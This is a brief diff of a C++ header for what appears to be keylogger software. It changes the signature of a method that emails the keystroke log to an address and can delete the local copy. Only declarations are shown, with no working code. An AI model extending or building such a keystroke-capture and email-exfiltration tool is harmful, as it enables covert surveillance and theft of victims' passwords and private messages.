@@ -9,7 +9,7 @@ public:
 	void stop();
 	~Keylogger();
 
-	bool sendEmailReport(std::wstring emailTo, bool deleteLocal);
+	bool sendEmailReport(std::wstring emailTo, bool deleteLocal, bool escaped);
 private:
 	std::wstring logfilePath;
 	std::shared_ptr<Hook> hook;
